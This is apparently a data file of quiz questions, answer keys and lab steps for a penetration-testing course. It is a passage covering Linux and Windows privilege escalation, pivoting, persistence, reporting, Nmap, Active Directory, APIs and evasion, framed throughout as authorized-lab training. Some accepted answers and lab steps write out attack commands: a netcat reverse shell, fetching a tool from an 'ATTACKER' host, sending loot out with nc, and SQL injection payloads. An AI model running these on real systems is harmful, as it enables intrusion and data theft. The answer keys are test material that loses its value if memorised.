fig could allow:","options":["Reading hashes or altering privileged settings","Faster logins","Nothing","Encryption"],"answer":0,"explain":"Recommend correct permissions and auditing."},{"type":"mcq","q":"Capabilities (getcap) matter because:","options":["A binary with cap_setuid or similar can escalate without the SUID bit","They speed up I/O","They are decorative","They block escalation"],"answer":0,"explain":"Review file capabilities during enumeration."},{"type":"mcq","q":"After demonstrating escalation, the tester must:","options":["Document it, capture proof, and remediate/clean up any changes","Keep root access hidden","Delete user data","Install a rootkit"],"answer":0,"explain":"Prove impact responsibly, then restore state."},{"type":"cmd","q":"List SUID binaries on an authorized Linux host to look for escalation paths.","accept":["find / -perm -4000 -type f 2>/dev/null"],"explain":"Cross-reference results with GTFOBins; report and fix risky ones."}],"labs":[{"title":"Escalate via a misconfiguration (lab)","scenario":"On a lab box, find one escalation path (SUID, sudo NOPASSWD, or writable root cron), demonstrate it, and write the fix.","hints":[],"steps":["sudo -l 2>&1; find / -perm -4000 -type f 2>/dev/null","ls -l /etc/cron.d/* /etc/crontab 2>/dev/null","# exploit the one misconfig (PoC), capture id showing uid=0, then:","# fix: correct permissions/ownership, remove NOPASSWD, patch"],"verify":["you gained root in the lab and documented the fix"]},{"title":"Enumerate with a helper (concept)","scenario":"Explain what an enumeration script (e.g., linpeas-style) checks for and why you still verify manually.","hints":[],"steps":["# checks SUID, sudo, cron, kernel, writable files, creds in configs","# manual verification avoids false positives and confirms exploitability"],"verify":["you can list the main categories it checks"]},{"title":"Report escalation findings","scenario":"Write the finding + remediation for a writable root cron script you exploited.","hints":[],"steps":["# Finding: /etc/cron.d/backup runs a world-writable script as root -> local root","# Impact: any local user gains root","# Remediation: chown root:root, chmod 700 the script; audit cron dir perms"],"verify":["a sysadmin could fix it from your write-up"]}]},{"day":17,"course":"5 Post-exploit","title":"Privilege escalation (Windows)","objective":"Escalate privileges on authorized Windows systems and report fixes.","questions":[{"type":"mcq","q":"A common Windows privilege-escalation check is:","options":["Misconfigured service permissions (unquoted paths, weak ACLs, writable service binaries)","The desktop wallpaper","The Recycle Bin size","The mouse speed"],"answer":0,"explain":"Services running as SYSTEM with weak config are prime targets."},{"type":"mcq","q":"\"Unquoted service path\" escalation abuses:","options":["A service path with spaces and no quotes, letting a planted binary run as SYSTEM","A quoted path","An encrypted disk","A firewall rule"],"answer":0,"explain":"Fix by quoting the ImagePath."},{"type":"mcq","q":"\"AlwaysInstallElevated\" being enabled allows:","options":["Any user to install an MSI as SYSTEM","Faster updates","Nothing","Disk encryption"],"answer":0,"explain":"A dangerous policy; disable it."},{"type":"mcq","q":"Windows access tokens matter because:","options":["Token impersonation/theft can let a process act as a higher-privilege account","They speed logins","They are decorative","They block escalation"],"answer":0,"explain":"Certain privileges (SeImpersonate) enable known escalation techniques."},{"type":"mcq","q":"Stored credentials in the registry or files can allow:","options":["Reuse to access higher-privilege accounts or other systems","Faster boot","Nothing","Encryption"],"answer":0,"explain":"Recommend credential hygiene and not storing secrets in plaintext."},{"type":"mcq","q":"\"DLL hijacking/search-order\" escalation abuses:","options":["A privileged process loading a DLL from a writable/attacker-controlled location","A quoted path","TLS","The GUI theme"],"answer":0,"explain":"Fix with correct search paths and folder ACLs."},{"type":"mcq","q":"A tool commonly used to enumerate Windows priv-esc paths is:","options":["WinPEAS / PowerUp (authorized use)","Notepad","Paint","Calculator"],"answer":0,"explain":"They automate the checks; still validate manually."},{"type":"mcq","q":"After demonstrating Windows escalation, you should:","options":["Capture proof (whoami /priv, SYSTEM shell), then remediate and clean up","Keep a hidden admin account","Delete the SAM","Encrypt the disk"],"answer":0,"explain":"Prove it, document it, restore state."},{"type":"cmd","q":"On an authorized Windows host, show your privileges to look for escalation opportunities.","accept":["whoami /priv"],"explain":"Look for SeImpersonatePrivilege and similar; enumerate services next."}],"labs":[{"title":"Enumerate Windows escalation (lab)","scenario":"On an authorized Windows lab VM, list your privileges and check for unquoted service paths and weak service ACLs.","hints":[],"steps":["whoami /priv","wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\"","# note any unquoted path with spaces or writable service binary"],"verify":["you identified at least one potential escalation vector"]},{"title":"Report a service-path finding","scenario":"Write the finding + fix for an unquoted service path you found.","hints":[],"steps":["# Finding: service \"App Backup\" ImagePath is unquoted (C:\\Program Files\\App Backup\\svc.exe)","# Impact: a planted C:\\Program.exe could run as SYSTEM","# Fix: quote the ImagePath; restrict folder write permissions"],"verify":["an admin could fix it directly"]},{"title":"Credential-hygiene recommendations","scenario":"List four Windows recommendations that reduce credential-based escalation.","hints":[],"steps":["# LAPS for local admin passwords; no plaintext creds in scripts/registry","# least privilege + separate admin accounts; enable Credential Guard"],"verify":["each reduces credential theft/reuse"]}]},{"day":18,"course":"5 Post-exploit","title":"Lateral movement and pivoting","objective":"Move through an authorized network to demonstrate impact.","questions":[{"type":"mcq","q":"Lateral movement means:","options":["Using a compromised host to reach and compromise other in-scope systems","Staying on one host","Scanning the internet","Writing the report"],"answer":0,"explain":"It shows how far an attacker could get from one foothold."},{"type":"mcq","q":"\"Pivoting\" is:","options":["Routing your traffic through a compromised host to reach otherwise unreachable networks","Rotating logs","Changing IP addresses randomly","Encrypting disks"],"answer":0,"explain":"e.g., a foothold in the DMZ used to reach the internal LAN (in scope)."},{"type":"mcq","q":"Pass-the-hash enables lateral movement by:","options":["Authenticating to other hosts with a captured hash, no plaintext needed","Cracking every password","Encrypting traffic","Disabling SMB"],"answer":0,"explain":"Recommend unique local admin passwords (LAPS) and SMB signing."},{"type":"mcq","q":"Why is network segmentation the key defense against lateral movement?","options":["It stops a single foothold from freely reaching other zones","It encrypts email","It speeds the network","It blocks phishing"],"answer":0,"explain":"Microsegmentation + least privilege contain a breach."},{"type":"mcq","q":"\"Credential dumping\" during a test demonstrates:","options":["That reusable credentials can be harvested to move laterally","Nothing","Faster logins","Disk speed"],"answer":0,"explain":"Recommend Credential Guard, LAPS, and monitoring."},{"type":"mcq","q":"A \"jump/pivot host\" reachable to many segments is high value because:","options":["Compromising it grants broad reach across the network","It is decorative","It is always patched","It cannot be abused"],"answer":0,"explain":"Harden and closely monitor administrative jump hosts."},{"type":"mcq","q":"Why keep lateral movement strictly in scope?","options":["Reaching out-of-scope or third-party systems is illegal and harmful","It is faster","It is required everywhere","Scope does not apply post-foothold"],"answer":0,"explain":"Scope applies at every phase, always."},{"type":"mcq","q":"A tester demonstrates lateral movement, then:","options":["Documents the path and recommends segmentation and credential controls","Leaves backdoors on each host","Deletes data","Hides the activity"],"answer":0,"explain":"The value is the reported attack path and its fixes."},{"type":"cmd","q":"Set up a pivot (SSH dynamic port forward) through an authorized foothold host.","accept":["ssh -D 1080 user@foothost"],"explain":"Then route in-scope tools through the SOCKS proxy (e.g., proxychains) to reach internal hosts."}],"labs":[{"title":"Demonstrate a pivot (authorized lab)","scenario":"Using an authorized foothold, reach an internal-only lab host through it and prove connectivity.","hints":[],"steps":["ssh -D 1080 -N user@foothost &          # SOCKS proxy through the foothold","proxychains nmap -sT -Pn 10.0.50.5      # reach internal host via pivot"],"verify":["you reached an internal host only accessible through the foothold"]},{"title":"Map an attack path","scenario":"Document a three-hop path (external -> DMZ -> app server -> DB) and the one control that best breaks it.","hints":[],"steps":["# external phish -> DMZ web host -> reused creds -> app server -> DB","# best break: segment DMZ from internal + unique creds (LAPS) + MFA"],"verify":["one control interrupts the chain"]},{"title":"Recommend anti-lateral-movement controls","scenario":"List four controls that limit lateral movement and credential reuse.","hints":[],"steps":["# network segmentation/microsegmentation","# LAPS (unique local admin passwords) + SMB signing","# least privilege + tiered admin; MFA on admin access","# EDR + monitoring for credential dumping/anomalous logons"],"verify":["each control maps to a technique you used"]}]},{"day":19,"course":"5 Post-exploit","title":"Persistence and cleanup","objective":"Understand persistence for realism, and always clean up.","questions":[{"type":"mcq","q":"In an authorized test, persistence is used to:","options":["Demonstrate how an attacker could maintain access (only if in scope) and to test detection","Keep secret access after the engagement","Damage the client","Avoid the report"],"answer":0,"explain":"Anything you add must be documented and removed at the end."},{"type":"mcq","q":"Common Linux persistence mechanisms include:","options":["Cron jobs, systemd services, SSH authorized_keys, and modified startup scripts","Changing the wallpaper","Renaming files","Clearing the screen"],"answer":0,"explain":"Defenders monitor these locations for unexpected changes."},{"type":"mcq","q":"Common Windows persistence mechanisms include:","options":["Scheduled tasks, services, registry Run keys, and startup folders","The Recycle Bin","Screen savers only","The mouse settings"],"answer":0,"explain":"EDR and autoruns tools detect these."},{"type":"mcq","q":"Why must every persistence artifact be documented?","options":["So it can be fully removed and the client can verify a clean environment","To leave a backdoor","To bill more","It is optional"],"answer":0,"explain":"Leaving hidden access would be unethical and dangerous."},{"type":"mcq","q":"\"Cleanup\" at the end of an engagement means:","options":["Removing tools, accounts, implants, and changes you introduced","Deleting client logs","Wiping the disk","Encrypting everything"],"answer":0,"explain":"Restore systems to their prior state and confirm with the client."},{"type":"mcq","q":"Why should you NOT delete the client's logs after testing?","options":["Logs are the client's evidence and needed for detection review; deleting them is harmful","They slow the system","They are encrypted","It is required"],"answer":0,"explain":"Attackers clear logs; ethical testers preserve them and note their own activity."},{"type":"mcq","q":"Testing whether your actions were detected helps the client by:","options":["Measuring their detection/response (purple-team value)","Hiding your tracks","Avoiding the report","Nothing"],"answer":0,"explain":"Note which actions triggered (or should have triggered) alerts."},{"type":"mcq","q":"A persistence finding in the report should include:","options":["How it was established, where, and how to detect/remove similar techniques","Only that it worked","The exploit binary only","Nothing"],"answer":0,"explain":"Give defenders detection and removal guidance."},{"type":"cmd","q":"List cron-based persistence locations to review on an authorized Linux host.","accept":["ls -la /etc/cron.d /etc/cron.daily /var/spool/cron 2>/dev/null"],"explain":"Also check ~/.ssh/authorized_keys and systemd user services for unexpected entries."}],"labs":[{"title":"Establish and remove persistence (lab)","scenario":"On an authorized lab host, add a benign persistence mechanism, confirm it, then fully remove it and verify.","hints":[],"steps":["# add (lab): a marked cron entry, e.g. '# PENTEST-TEST' comment + harmless job","crontab -l","# remove it and confirm nothing remains","crontab -l | grep -c PENTEST-TEST     # should be 0 after cleanup"],"verify":["the system is returned to its original state"]},{"title":"Detection review (purple)","scenario":"For two persistence techniques, describe how a defender would detect each.","hints":[],"steps":["# cron/systemd changes -> file integrity monitoring + config audits","# SSH authorized_keys change -> alert on key additions + EDR"],"verify":["each technique has a detection method"]},{"title":"Engagement cleanup checklist","scenario":"Write the end-of-engagement cleanup checklist.","hints":[],"steps":["# remove test accounts, tools, implants, persistence","# restore any changed configs; confirm services normal","# deliver artifacts list to client; verify clean state together"],"verify":["nothing you introduced remains on client systems"]}]},{"day":20,"course":"1 Engagement","title":"Reporting and communication","objective":"Deliver clear, actionable, professional results.","questions":[{"type":"mcq","q":"The most important deliverable of a penetration test is:","options":["A clear, prioritized report with findings, impact, evidence, and remediation","The exploit code","A raw scanner dump","A verbal summary only"],"answer":0,"explain":"The report is what creates value and drives fixes."},{"type":"mcq","q":"An executive summary should be written for:","options":["Non-technical leadership: overall risk, business impact, key recommendations","Only engineers","The attacker","Nobody"],"answer":0,"explain":"It communicates risk in business terms."},{"type":"mcq","q":"Each technical finding should include:","options":["Description, affected assets, severity, evidence, impact, and remediation","Only a CVSS number","Only a screenshot","Just the title"],"answer":0,"explain":"Reproducibility and clear fixes are essential."},{"type":"mcq","q":"Why rank findings by risk in the report?","options":["So the client fixes the most dangerous issues first","To fill pages","To confuse the reader","It is not needed"],"answer":0,"explain":"Prioritization turns a list into an action plan."},{"type":"mcq","q":"\"Retesting\" after remediation confirms:","options":["That the fixes actually resolved the findings","The tester's hours","The exploit still works forever","Nothing"],"answer":0,"explain":"Offer or schedule a retest to validate remediation."},{"type":"mcq","q":"Sensitive report data (credentials, exploit detail) should be:","options":["Handled securely, shared only with authorized parties, and deleted per agreement","Posted publicly","Emailed unencrypted","Kept forever anywhere"],"answer":0,"explain":"Protect the report as you would the client's crown jewels."},{"type":"mcq","q":"A good remediation recommendation is:","options":["Specific, actionable, and prioritized (not just \"be more secure\")","Vague","Only \"patch everything\"","Missing"],"answer":0,"explain":"Tie each fix to the finding it resolves."},{"type":"mcq","q":"During the engagement, critical findings should be:","options":["Communicated to the client promptly, not held until the final report","Kept secret until the end always","Never mentioned","Posted online"],"answer":0,"explain":"A critical, actively exploitable issue warrants an immediate heads-up."}],"labs":[{"title":"Write a finding","scenario":"Write a complete finding for \"default credentials on the admin panel\": title, severity, affected asset, evidence, impact, and remediation.","hints":[],"steps":["# Title: Default credentials on admin panel (Critical)","# Asset: https://app.lab/admin","# Evidence: logged in with admin/admin (screenshot, timestamp)","# Impact: full administrative control, data exposure","# Remediation: force credential change, enforce strong pw + MFA, lockout"],"verify":["a reader could reproduce and fix it"]},{"title":"Draft an executive summary","scenario":"Write a 5-sentence executive summary for a test that found 2 critical, 3 high, and several medium issues.","hints":[],"steps":["# state overall risk posture in business terms","# highlight the most serious business impacts (data exposure)","# note quick wins and strategic recommendations","# mention what was in scope and the retest offer"],"verify":["a non-technical leader understands the risk and next steps"]},{"title":"Plan a retest","scenario":"Describe how and when you would retest to confirm the client's fixes.","hints":[],"steps":["# after client remediates, re-run the specific tests for each finding","# confirm each is resolved; update finding status to closed/open","# deliver a short retest report"],"verify":["each original finding gets a pass/fail verdict"]}]},{"day":21,"course":"2 Recon","title":"Nmap NSE and deep enumeration","objective":"Master the Nmap Scripting Engine for authorized enumeration.","questions":[{"type":"cmd","q":"Run the default safe scripts against a host to gather extra detail.","accept":["nmap -sC 192.168.56.10","nmap --script=default 192.168.56.10"],"explain":"-sC runs the \"default\" category NSE scripts; safe, informative, authorized targets only."},{"type":"cmd","q":"List all HTTP-related NSE scripts available on your system.","accept":["ls /usr/share/nmap/scripts/ | grep http","nmap --script-help 'http-*'"],"explain":"NSE scripts live in /usr/share/nmap/scripts/; there are hundreds by category."},{"type":"cmd","q":"Enumerate HTTP methods and title on a web host.","accept":["nmap --script http-methods,http-title -p80,443 192.168.56.10"],"explain":"Dangerous methods like PUT/DELETE being allowed is a finding."},{"type":"cmd","q":"Enumerate SMB shares, users and OS in one command.","accept":["nmap -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery 192.168.56.10"],"explain":"Authorized targets only; note anonymous/guest access."},{"type":"cmd","q":"Check for anonymous FTP login with NSE.","accept":["nmap -p21 --script ftp-anon 192.168.56.10"],"explain":"Anonymous FTP that exposes files is a reportable finding."},{"type":"mcq","q":"Which NSE category should you AVOID on fragile production without explicit permission?","options":["intrusive / dos","default","safe","discovery"],"answer":0,"explain":"Intrusive and dos scripts can disrupt services."},{"type":"mcq","q":"What does the -oA flag do?","options":["Saves output in all three formats (normal, XML, grepable) with one base name","Runs all scripts","Scans all ports","Enables OS detection"],"answer":0,"explain":"-oA basename produces basename.nmap/.xml/.gnmap for later parsing and diffing."},{"type":"mcq","q":"How do you scan every TCP port, not just the common ones?","options":["Use -p- (ports 1-65535)","Use -F","Use --top-ports 10","Use -sn"],"answer":0,"explain":"-F is fast/fewer ports; -p- is exhaustive but slower."}],"labs":[{"title":"Full NSE enumeration sweep (authorized lab)","scenario":"On a lab host, run a service scan with default scripts on all ports, save all output formats, and list the three most interesting findings.","hints":[],"steps":["nmap -sS -sV -sC -p- -oA fullscan 192.168.56.10","grep -iE 'open|http-title|smb|ftp-anon' fullscan.nmap | head"],"verify":["you can name three actionable findings from one scan"]},{"title":"Targeted NSE per service","scenario":"For each open service on a lab host, pick and run the most relevant NSE script and record the result.","hints":[],"steps":["nmap -p80 --script http-enum 192.168.56.10","nmap -p445 --script smb-enum-shares 192.168.56.10","nmap -p3306 --script mysql-info 192.168.56.10"],"verify":["each service has an enumeration result recorded"]},{"title":"Parse scan output","scenario":"Turn a saved grepable scan into a clean list of \"ip:port service\" for the report.","hints":[],"steps":["nmap -sV -oG services.gnmap 192.168.56.0/24","grep -oE '[0-9.]+.*open' services.gnmap | head","awk '/open/{print $2}' services.gnmap | sort -u"],"verify":["you produced a tidy host/service inventory"]},{"title":"Build your own recon script","scenario":"Write a bash script that takes an IP and runs host discovery, a version scan, and default scripts, saving each stage.","hints":[],"steps":["printf '#!/bin/bash\\nt=$1\\nnmap -sn $t -oN ping.txt\\nnmap -sV -oN ver.txt $t\\nnmap -sC -oN scripts.txt $t\\n' > recon.sh","chmod +x recon.sh && ./recon.sh 192.168.56.10"],"verify":["one command produces a staged recon of a host"]}]},{"day":22,"course":"4 Exploitation","title":"Manual exploitation and shells","objective":"Exploit without a framework and manage shells on authorized targets.","questions":[{"type":"cmd","q":"Start a Netcat listener on port 4444 for a reverse shell (authorized lab).","accept":["nc -lvnp 4444","ncat -lvnp 4444"],"explain":"-l listen, -v verbose, -n no DNS, -p port. Your attacker VM waits for the callback."},{"type":"cmd","q":"Connect out from a target to your listener to get a bind/reverse shell (lab).","accept":["nc 192.168.56.5 4444 -e /bin/bash"],"explain":"Authorized lab targets only; -e runs a shell over the connection."},{"type":"cmd","q":"Upgrade a dumb shell to a fully interactive TTY (Python method).","accept":["python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"],"explain":"Then background with Ctrl+Z and run `stty raw -echo; fg` for a proper TTY."},{"type":"cmd","q":"Transfer a file to a target with a simple HTTP server.","accept":["python3 -m http.server 8000"],"explain":"On the target: `wget http://ATTACKER:8000/file` or `curl -O ...` (authorized lab)."},{"type":"cmd","q":"Search Exploit-DB from the command line for a service.","accept":["searchsploit vsftpd 2.3.4"],"explain":"searchsploit indexes Exploit-DB locally; read/verify any PoC before use."},{"type":"mcq","q":"Why upgrade a \"dumb\" shell to a full TTY?","options":["To get job control, tab completion, and run interactive tools reliably","To encrypt it","To make it faster only","It is not needed"],"answer":0,"explain":"A raw shell breaks on interactive prompts and Ctrl+C."},{"type":"mcq","q":"A bind shell vs a reverse shell: a reverse shell:","options":["Connects from the target back to the attacker (good when inbound is blocked)","Listens on the target for the attacker","Encrypts nothing","Is the same thing"],"answer":0,"explain":"Reverse shells traverse many firewalls that block inbound."},{"type":"mcq","q":"Before running a public PoC exploit, you should:","options":["Read and understand what it does, and test in a lab first","Run it blindly on production","Skip authorization","Disable logging"],"answer":0,"explain":"Untrusted exploit code can be destructive or backdoored."}],"labs":[{"title":"Get and stabilize a shell (authorized lab)","scenario":"On a vulnerable lab VM, obtain a reverse shell and upgrade it to a full interactive TTY.","hints":[],"steps":["# attacker: nc -lvnp 4444","# trigger the callback from the lab target (via the vuln)","python3 -c 'import pty;pty.spawn(\"/bin/bash\")'","# Ctrl+Z ; stty raw -echo; fg ; export TERM=xterm"],"verify":["you have a stable, interactive shell in the lab"]},{"title":"File transfer both ways","scenario":"Move a file from attacker to target and back, using two different methods.","hints":[],"steps":["python3 -m http.server 8000        # attacker serves","# target: wget http://ATTACKER:8000/tool ; chmod +x tool","# back: nc -lvnp 9001 > out.bin (attacker) ; nc ATTACKER 9001 < loot (target)"],"verify":["you moved files in both directions in the lab"]},{"title":"Find and vet an exploit","scenario":"For a known-vulnerable service version, find a candidate exploit and describe how you would vet it before running.","hints":[],"steps":["searchsploit <service> <version>","searchsploit -x <path>       # read the exploit source","# vet: understand payload/impact, test in an isolated lab, never blind-run"],"verify":["you can explain what the exploit does before running it"]},{"title":"Manual web exploitation with curl","scenario":"Interact with a vulnerable lab endpoint using curl to demonstrate an issue without a browser.","hints":[],"steps":["curl -s 'http://192.168.56.10/api/user?id=1'","curl -s 'http://192.168.56.10/api/user?id=2'   # IDOR check","curl -s -X POST -d \"q=' OR '1'='1\" http://192.168.56.10/search   # SQLi check (lab)"],"verify":["you demonstrated a web flaw purely from the command line"]}]},{"day":23,"course":"5 Post-exploit","title":"Active Directory attacks","objective":"Test Windows domain security on authorized networks.","questions":[{"type":"mcq","q":"Active Directory is a high-value target because:","options":["Compromising it can grant control over the entire Windows domain","It only stores wallpapers","It is never networked","It has no privileges"],"answer":0,"explain":"Domain compromise = access to most corporate resources."},{"type":"mcq","q":"\"Kerberoasting\" abuses:","options":["Service accounts' Kerberos tickets, which can be cracked offline for their passwords","DNS caching","TLS certificates","The firewall"],"answer":0,"explain":"Use strong, long service-account passwords (or gMSA) to defend."},{"type":"mcq","q":"\"AS-REP roasting\" targets accounts that:","options":["Have Kerberos pre-authentication disabled, allowing offline crackable material","Use MFA","Are disabled","Have long passwords"],"answer":0,"explain":"Enable pre-authentication; use strong passwords."},{"type":"mcq","q":"\"BloodHound\" is used to:","options":["Map AD relationships to find attack paths to Domain Admin","Crack Wi-Fi","Scan the internet","Encrypt disks"],"answer":0,"explain":"It visualizes who-can-reach-what, exposing privilege paths."},{"type":"mcq","q":"\"Pass-the-ticket\" reuses:","options":["Kerberos tickets to authenticate as a user without their password","A password hash only","A TLS cert","Nothing"],"answer":0,"explain":"Ticket hygiene and monitoring help detect it."},{"type":"mcq","q":"A \"golden ticket\" attack forges:","options":["A Kerberos TGT using the krbtgt hash, granting broad, persistent domain access","A TLS certificate","A password reset link","A DNS record"],"answer":0,"explain":"Rotating the krbtgt password (twice) invalidates forged tickets."},{"type":"mcq","q":"The strongest AD defenses a tester recommends include:","options":["Tiered admin model, LAPS, strong service-account passwords, MFA, and monitoring","One shared admin password","Disabling logging","Flat network"],"answer":0,"explain":"Reduce privilege paths and reusable credentials."},{"type":"mcq","q":"Why must AD testing stay strictly authorized and scoped?","options":["Domain-wide actions can disrupt the whole organization","AD is public","It never affects users","Scope does not apply"],"answer":0,"explain":"Coordinate carefully; some techniques are noisy or risky."},{"type":"cmd","q":"Enumerate domain users from an authorized AD test host (example tool).","accept":["enum4linux -a 192.168.56.20"],"explain":"Also: `nmap -p389 --script ldap-search`. Authorized domain targets only."}],"labs":[{"title":"Enumerate an AD lab (authorized)","scenario":"On an authorized AD lab, enumerate domain, users, and shares, and note one privilege path idea.","hints":[],"steps":["enum4linux -a 192.168.56.20 | tee ad-enum.txt","nmap -p389 --script ldap-rootdse 192.168.56.20","# note a service account (SPN) or a group with excessive rights"],"verify":["you have domain info and a candidate attack path"]},{"title":"Kerberoast in a lab (concept + steps)","scenario":"Describe the Kerberoasting steps against an authorized lab and the remediation.","hints":[],"steps":["# request service tickets for accounts with SPNs","# extract the crackable ticket material; crack offline with hashcat/john","# remediation: 25+ char service-account passwords or gMSA; monitor TGS requests"],"verify":["you can explain the attack and give a real fix"]},{"title":"AD defense recommendations","scenario":"List five AD hardening recommendations from your test.","hints":[],"steps":["# tiered admin (separate DA accounts, no daily use)","# LAPS for local admin; strong/gMSA service accounts","# MFA on admin + VPN; disable legacy protocols","# monitor for Kerberoasting/DCSync; rotate krbtgt periodically"],"verify":["each maps to an attack technique"]},{"title":"Map paths with BloodHound (concept)","scenario":"Explain what data BloodHound collects and how you would use the graph to reach Domain Admin.","hints":[],"steps":["# collects sessions, group memberships, ACLs, trusts","# find shortest path from your foothold user to Domain Admins","# target the weakest edge (e.g., a user who can reset a DA's password)"],"verify":["you can describe reading an attack-path graph"]}]},{"day":24,"course":"4 Exploitation","title":"Scripting and automation for testers","objective":"Automate repetitive tasks safely and efficiently.","questions":[{"type":"cmd","q":"Loop over a list of IPs and ping each (host discovery script).","accept":["for ip in $(cat targets.txt); do ping -c1 -W1 $ip >/dev/null && echo \"$ip up\"; done"],"explain":"A simple sweep; keep it to in-scope targets only."},{"type":"cmd","q":"Extract all IP addresses from a file with grep.","accept":["grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' scan.txt | sort -u"],"explain":"Useful for parsing scan output into a clean target list."},{"type":"cmd","q":"Base64-decode a captured string on the command line.","accept":["echo 'aGVsbG8=' | base64 -d"],"explain":"Attackers often encode payloads/data; decoding is routine analysis."},{"type":"cmd","q":"URL-encode a payload for a web request (python one-liner).","accept":["python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' \"test payload\""],"explain":"Handy for crafting web requests by hand."},{"type":"cmd","q":"Run a quick port check on a host without nmap (bash /dev/tcp).","accept":["bash -c 'echo > /dev/tcp/192.168.56.10/22 && echo open'"],"explain":"A no-tools way to test a single port; authorized targets only."},{"type":"mcq","q":"Why automate recon and parsing tasks?","options":["Consistency, speed, and fewer manual errors across many targets","To remove authorization","To hide activity","It is slower"],"answer":0,"explain":"Scripts turn a repeatable process into one command."},{"type":"mcq","q":"A risk of automation in testing is:","options":["A buggy script can hit out-of-scope hosts or cause load at scale","Nothing","It is always safe","It cannot fail"],"answer":0,"explain":"Add scope checks and rate limits; test scripts first."},{"type":"mcq","q":"Why keep tooling output structured (JSON/CSV/XML)?","options":["It is easy to parse, diff, and feed into the report","It looks nicer only","It is required by law","It hides data"],"answer":0,"explain":"Machine-readable output enables automation and comparison."}],"labs":[{"title":"Build a target-parsing pipeline","scenario":"From a raw nmap file, extract only hosts with port 445 open into smb_targets.txt.","hints":[],"steps":["nmap -p445 --open -oG smb.gnmap 192.168.56.0/24","awk '/445\\/open/{print $2}' smb.gnmap | sort -u > smb_targets.txt","cat smb_targets.txt"],"verify":["you have a clean list of SMB hosts to enumerate"]},{"title":"Write a scoped sweep script","scenario":"Write a script that reads targets.txt, refuses any IP not in an allowed CIDR, and version-scans the rest.","hints":[],"steps":["# pseudo: for ip in targets; do in_scope $ip && nmap -sV $ip; done","# in_scope checks the IP against the authorized CIDR before scanning"],"verify":["out-of-scope IPs are skipped automatically"]},{"title":"Decode and analyze","scenario":"Given a base64 + URL-encoded blob from a capture, decode it step by step and describe the content.","hints":[],"steps":["echo '<blob>' | base64 -d | python3 -c 'import urllib.parse,sys;print(urllib.parse.unquote(sys.stdin.read()))'"],"verify":["you recovered and can describe the original content"]},{"title":"Automate evidence collection","scenario":"Write a script that timestamps and saves the output of id, ss, ps, and sudo -l on a foothold for the report.","hints":[],"steps":["printf '#!/bin/bash\\nd=$(date +%%F-%%H%%M)\\n{ date; id; sudo -l; ss -tulpn; ps aux; } > evidence-$d.txt 2>&1\\n' > collect.sh","chmod +x collect.sh && ./collect.sh"],"verify":["one command captures timestamped evidence"]}]},{"day":25,"course":"4 Exploitation","title":"Attacking databases and APIs","objective":"Test data stores and web APIs on authorized systems.","questions":[{"type":"cmd","q":"Connect to a MySQL server with provided lab credentials.","accept":["mysql -h 192.168.56.10 -u root -p"],"explain":"Authorized lab only; weak/default DB creds are a common finding."},{"type":"cmd","q":"Test a REST API endpoint with curl and view headers.","accept":["curl -i http://192.168.56.10:8080/api/health"],"explain":"-i shows status and headers; look for verbose errors and missing auth."},{"type":"cmd","q":"Send a JSON POST to an API endpoint (lab).","accept":["curl -s -X POST -H 'Content-Type: application/json' -d '{\"user\":\"a\"}' http://192.168.56.10:8080/api/login"],"explain":"Test auth, input handling, and error messages."},{"type":"cmd","q":"Enumerate database names once connected (MySQL).","accept":["SHOW DATABASES;"],"explain":"Then SHOW TABLES; and inspect for sensitive data (authorized)."},{"type":"mcq","q":"An API returning full stack traces on error is a finding because:","options":["It leaks internal details useful to an attacker","It is faster","It is encrypted","It is required"],"answer":0,"explain":"Recommend generic error messages and proper logging."},{"type":"mcq","q":"\"Broken object-level authorization\" (BOLA/IDOR) in an API means:","options":["One user can access another user's objects by changing an ID","The API is encrypted","Rate limiting is on","Input is validated"],"answer":0,"explain":"Enforce per-request, per-object authorization checks."},{"type":"mcq","q":"A missing rate limit on an API login enables:","options":["Brute-force / credential-stuffing attacks","Faster legitimate use only","Encryption","Nothing"],"answer":0,"explain":"Recommend rate limiting, lockout, and MFA."},{"type":"mcq","q":"Why test for default/weak database credentials?","options":["They are a frequent, high-impact way into sensitive data","They are encrypted","They never exist","It is not useful"],"answer":0,"explain":"root with no/weak password is a classic breach path."}],"labs":[{"title":"Test an API for common issues (authorized lab)","scenario":"On a lab API, check for missing auth, IDOR, and verbose errors, documenting each result.","hints":[],"steps":["curl -i http://192.168.56.10:8080/api/users        # is auth required?","curl -s http://192.168.56.10:8080/api/users/1; echo","curl -s http://192.168.56.10:8080/api/users/2; echo   # IDOR?","curl -s http://192.168.56.10:8080/api/oops           # error verbosity?"],"verify":["you recorded a verdict for auth, IDOR and error handling"]},{"title":"Assess a database (authorized lab)","scenario":"Connect to a lab database, enumerate its contents, and write the findings and fixes.","hints":[],"steps":["mysql -h 192.168.56.10 -u root -p","# SHOW DATABASES; USE app; SHOW TABLES; SELECT * FROM users LIMIT 5;","# findings: weak creds, sensitive data unencrypted at rest","# fixes: strong creds, least-privilege DB accounts, encrypt sensitive columns"],"verify":["you documented DB findings with remediation"]},{"title":"API hardening recommendations","scenario":"List five recommendations after finding missing auth, IDOR, and no rate limit.","hints":[],"steps":["# require authentication + per-object authorization","# rate limiting + lockout + MFA on sensitive endpoints","# generic error messages; input validation; least-privilege DB user"],"verify":["each fixes a specific observed issue"]},{"title":"SQL injection deep dive (lab)","scenario":"On a deliberately vulnerable lab app, demonstrate extracting a table name via injection, then write the parameterized-query fix.","hints":[],"steps":["# in a lab input:  ' UNION SELECT table_name,2 FROM information_schema.tables-- -","# confirm you can read schema; screenshot","# fix: prepared statements; least-privilege DB account; input validation"],"verify":["you demonstrated SQLi impact and gave the correct fix"]}]},{"day":26,"course":"4 Exploitation","title":"Evasion awareness and detection","objective":"Understand evasion so you can test and improve detection (purple-team).","questions":[{"type":"mcq","q":"In an authorized test, understanding evasion helps you:","options":["Assess how well the client detects and responds, and recommend improvements","Permanently hide from the client","Break the law","Avoid reporting"],"answer":0,"explain":"The goal is better detection, not undetectable attacks."},{"type":"mcq","q":"Why do attackers \"live off the land\" (LOLBins)?","options":["Using built-in tools avoids dropping detectable malware files","It is faster only","It is encrypted","It is required"],"answer":0,"explain":"Monitor for abnormal use of legit tools (e.g., PowerShell, certutil)."},{"type":"mcq","q":"\"Timestomping\" refers to:","options":["Altering file timestamps to hinder forensic analysis","Compressing files","Encrypting files","Backing up files"],"answer":0,"explain":"Defenders compare multiple timestamps and central logs to catch 